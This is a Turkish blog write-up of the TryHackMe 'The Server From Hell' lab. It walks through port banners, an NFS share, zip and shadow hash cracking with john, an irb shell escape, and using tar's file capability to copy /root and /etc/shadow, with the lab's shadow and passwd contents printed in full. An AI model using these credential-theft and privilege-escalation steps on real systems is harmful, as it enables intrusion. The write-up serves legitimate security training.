---
title: "THM The Server From Hell Write Up"
date: 2020-11-04T21:49:09+03:00
draft: false
toc: true
images:
tags: [Tryhackme,write-up,ssh,getcap,banner,irb,tar] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [The Server From Hell](https://tryhackme.com/room/theserverfromhell) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/thm/theserverfromhell/cover.png
  
---
*Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [The Server From Hell](https://tryhackme.com/room/theserverfromhell) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...*
## 1. Keşif Aşaması

Nmap ile port taraması yapıldığında tüm portların açık olduğu görülmektedir.:disappointed_relieved: Makina tasarımcısı tarafından keşif işlemine 1337 numaralı port ile başlamamız söylenmektedir. Telnet ile porta bağlantı sağlanır.

```bash
telnet 10.10.225.52 1337
```

{{< image src="/images/thm/theserverfromhell/telnet.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Bağlantı ile ilgili ipucunun ilk 100 portta yer aldığı ve tespit için bannerların yazdırılarak bulunabileceği belirtilmiştir. (Bir şu trollface meselesi var. Beni en çok uğraştıran kısmı bu oldu. Bulunca bir aydınlanma yaşamadım değil tabi...)

Bu aşamadan sonra banner tespiti için nmap'in banner scripti kullanılabilir. Ben burada nc ile ilk yüz porta sıra ile bağlantı denemeleri yaparak banner tespiti yaptım.

```bash
nc -v 10.10.225.52 1-100
```
```txt
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 49 (tacacs) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 48 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 47 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 46 (?) open
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff0010.10.225.52 [10.10.225.52] 45 (?) open
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff0010.10.225.52 [10.10.225.52] 44 (?) open
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff0010.10.225.52 [10.10.225.52] 43 (whois) open
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff0010.10.225.52 [10.10.225.52] 42 (?) open
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff0010.10.225.52 [10.10.225.52] 41 (?) open
550 12345 0fffffffffffffffffff700008888800000000088000080007fff0010.10.225.52 [10.10.225.52] 40 (?) open
550 12345 0fffffffffffffffff70008878800000000000008878008007fff0010.10.225.52 [10.10.225.52] 39 (?) open
550 12345 0fffffffffffffff800888880000000000000000000800800cfff0010.10.225.52 [10.10.225.52] 38 (?) open
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff0010.10.225.52 [10.10.225.52] 37 (time) open
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff0010.10.225.52 [10.10.225.52] 36 (?) open
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff0010.10.225.52 [10.10.225.52] 35 (?) open
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff0010.10.225.52 [10.10.225.52] 34 (?) open
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff0010.10.225.52 [10.10.225.52] 33 (?) open
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff0010.10.225.52 [10.10.225.52] 32 (?) open
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff0010.10.225.52 [10.10.225.52] 31 (?) open
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff0010.10.225.52 [10.10.225.52] 30 (?) open
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff0010.10.225.52 [10.10.225.52] 29 (?) open
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff0010.10.225.52 [10.10.225.52] 28 (?) open
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff0010.10.225.52 [10.10.225.52] 27 (?) open
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff0010.10.225.52 [10.10.225.52] 26 (?) open
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff0010.10.225.52 [10.10.225.52] 25 (smtp) open
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff0010.10.225.52 [10.10.225.52] 24 (?) open
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff0010.10.225.52 [10.10.225.52] 23 (telnet) open
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff0010.10.225.52 [10.10.225.52] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff0010.10.225.52 [10.10.225.52] 21 (ftp) open
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf0010.10.225.52 [10.10.225.52] 20 (ftp-data) open
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf0010.10.225.52 [10.10.225.52] 19 (chargen) open
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff0010.10.225.52 [10.10.225.52] 18 (?) open
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff0010.10.225.52 [10.10.225.52] 17 (qotd) open
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff0010.10.225.52 [10.10.225.52] 16 (?) open
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff0010.10.225.52 [10.10.225.52] 15 (netstat) open
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff0010.10.225.52 [10.10.225.52] 14 (?) open
550 12345 0fffffff8000000000008888000000000080000000000007fffff0010.10.225.52 [10.10.225.52] 13 (daytime) open
550 12345 0ffffffff000000888000000000800000080000008800007fffff0010.10.225.52 [10.10.225.52] 12 (?) open
550 12345 0ffffffff80008808880000000880000008880088800008ffffff0010.10.225.52 [10.10.225.52] 11 (systat) open
550 12345 0fffffffff000088808880000000000000088800000008fffffff0010.10.225.52 [10.10.225.52] 10 (?) open
550 12345 0fffffffff70000088800888800088888800008800007ffffffff0010.10.225.52 [10.10.225.52] 9 (discard) open
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff0010.10.225.52 [10.10.225.52] 8 (?) open
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff0010.10.225.52 [10.10.225.52] 7 (echo) open
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff0010.10.225.52 [10.10.225.52] 6 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 5 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 4 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 3 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 2 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 1 (tcpmux) open
550 12345 0000000000000000000000000000000000000000000000000000000─
```
Dikkatli bakınca 21. porttan dönen cevapta 12345 numaralı porta gidilmesi söylenmiştir. Ayrıca bizim trollface de baş aşağı görülmektedir. Aşağıda sizler için düzeltilmiş hali yer almaktadır. :stuck_out_tongue_winking_eye:

{{< image src="/images/thm/theserverfromhell/trollface.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

**Telnet** ile 12345 portuna bağlantı sağlanılır.

```bash
telnet 10.10.225.52 12345
```
{{< image src="/images/thm/theserverfromhell/12345.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

NFS ile ilgili bir ikaz yer almaktadır. ***Showmount*** aracı ile sistemde nfs ile bir dosya paylaşımı yapılıp yapılmadığı kontrol edilir.

```
showmount -e 10.10.225.52
```
{{< image src="/images/thm/theserverfromhell/nfss.png" alt="Hello Friend" position="center" style="border-radius: 4px;" >}}

Paylaşıma açık olan ***/home/nfs*** dizini localhosta mount edilerek paylaşım görüntülenir. 

```bash
sudo mkdir /tmp/mnt
sudo mount -t nfs 10.10.225.52:/home/nfs /tmp/mnt/ 
```
Localhostta ***/tmp/mnt/*** dizinine gidilerek dizin listelendiğinde backup.zip adında bir dosya tespit edilir. Dosya /tmp dizinine açılmaya çalışıldığında parola koruması olduğu görülür.

{{< image src="/images/thm/theserverfromhell/backup.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Zip dosyasının parola hash bilgisi ***zip2john*** aracı ile çıkarılır ve ***john*** ile sözlük saldırısı yapılarak parola elde edilir.

```bash
zip2john backup.zip > ../hash

john -wordlist=/usr/share/wordlists/rockyou.txt ../hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
1g 0:00:00:00 DONE (2020-11-04 11:28) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
***Unzip*** ile dosya açılır. 

{{< image src="/images/thm/theserverfromhell/unzip.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

İlk flag dosyası okunur.

{{< image src="/images/thm/theserverfromhell/flag1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Hades kullanıcısna ait ssh anahtarları görülmektedir. Hades kullanıcına ait private anahtar kullanılarak ssh bağlantısı sağlanılır. Ssh bağlantısı için açık port bulmak gerekmektedir. ***hint.txt*** dosyasına bakıldığında *2500-4500* port aralığı verilmiştir. Nmap ile aralıktaki portlar taranır.

```
nmap -sV -p2500-4500 10.10.225.52 
```

Elde edilen çıktıda ssh araması yapılır. Tespit edilen portlara bağlantı denemeleri yapıldığında 3333 numaralı portun açık olduğu görülmektedir.

```txt
3333/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

## 2. Erişim Sağlanması

Hades kullanıcısa ait ssh anahtarı kullanılarak *3333* numaralı porttan ssh bağlantısı sağlanır.

```bash
ssh -i .ssh/id_rsa -p 3333 root@10.10.225.52
```
{{< image src="/images/thm/theserverfromhell/ssh.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

***irb*** adlı bir uygulamaya bağlanılmıştır. Yapılan araştırmada interaktif ruby yorumlayıcısı olduğu tespit edilir. ```exec '/bin/bash'``` komutu bash kabuğuna geçilir. 

{{< image src="/images/thm/theserverfromhell/bash.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

User.txt dosyası okunarak ikinci flag elde edilir.

```txt
cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
```

## 3. Yetki Yükseltme

Yetki yükseltmek için LinEnum.sh betiği hedef makinaya yüklenir. Betik çalıştırıldığında ***getcap*** çıktısı dikkat çekmektedir.

{{< image src="/images/thm/theserverfromhell/priv.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

*Tar uygulaması için okuma (read) yetkisinin root yetkisi (ep) ile yapılabileceği görülmektedir.* Flag dosyasını elde etmek için direk /root dizini arşivlenir ve sıkıştırılan dosya açılarak makina çözümü tamamlanır.

```bash
###Compress

hades@hell:/tmp/etc$ /bin/tar -cvf root.tar /root
/bin/tar: Removing leading `/' from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile

###Decompress
hades@hell:/tmp/etc$ ls
root.tar  shadow

hades@hell:/tmp/etc$ tar -xvf root.tar 
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile
```

{{< image src="/images/thm/theserverfromhell/root.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Root yetkisi elde etmek için ***shadow*** dosyası arşivlenerek okunur. Daha sonra ***passwd*** dosyası okunur. 

```txt
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat shadow 

root:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
daemon:*:18513:0:99999:7:::
bin:*:18513:0:99999:7:::
sys:*:18513:0:99999:7:::
sync:*:18513:0:99999:7:::
games:*:18513:0:99999:7:::
man:*:18513:0:99999:7:::
lp:*:18513:0:99999:7:::
mail:*:18513:0:99999:7:::
news:*:18513:0:99999:7:::
uucp:*:18513:0:99999:7:::
proxy:*:18513:0:99999:7:::
www-data:*:18513:0:99999:7:::
backup:*:18513:0:99999:7:::
list:*:18513:0:99999:7:::
irc:*:18513:0:99999:7:::
gnats:*:18513:0:99999:7:::
nobody:*:18513:0:99999:7:::
systemd-network:*:18513:0:99999:7:::
systemd-resolve:*:18513:0:99999:7:::
syslog:*:18513:0:99999:7:::
messagebus:*:18513:0:99999:7:::
_apt:*:18513:0:99999:7:::
lxd:*:18513:0:99999:7:::
uuidd:*:18513:0:99999:7:::
dnsmasq:*:18513:0:99999:7:::
landscape:*:18513:0:99999:7:::
sshd:*:18513:0:99999:7:::
pollinate:*:18513:0:99999:7:::
vagrant:$6$XQAwkysB$wSkezwLStg6E8nT/h5ECcNdiBuGt98yNnjwVEB.YVEAQY9z5AamgBhYTUAzKRQjmNxpEOLP/a36mxdZyaKJk60:18513:0:99999:7:::
ubuntu:!:18520:0:99999:7:::
statd:*:18520:0:99999:7:::
ntp:*:18520:0:99999:7:::
hades:*:18520:0:99999:7:::

---------------------------------------------------------------

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
ntp:x:112:116::/nonexistent:/usr/sbin/nologin
hades:x:1002:1002:0,0,0,0:/home/hades:/usr/bin/irb
```

***Unshadow*** *aracı kullanılarak hesaplara ait hash bilgileri john ile kırılmak üzere hazır hale getirilir.*

```bash
unshadow passwd shadow > crackhash
```

John aracı kullanılarak root parolası elde edilir.

```bash
─[barcode@parrot]─[~]$ john -wordlist=/usr/share/wordlists/rockyou.txt crackhash 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (root)
1g 0:00:00:06 0.07% (ETA: 14:56:04) 0.1494g/s 1798p/s 1951c/s 1951C/s 123qaz..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
Root hesabıyla ssh bağlantısı sağlanır.

{{< image src="/images/thm/theserverfromhell/root2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}









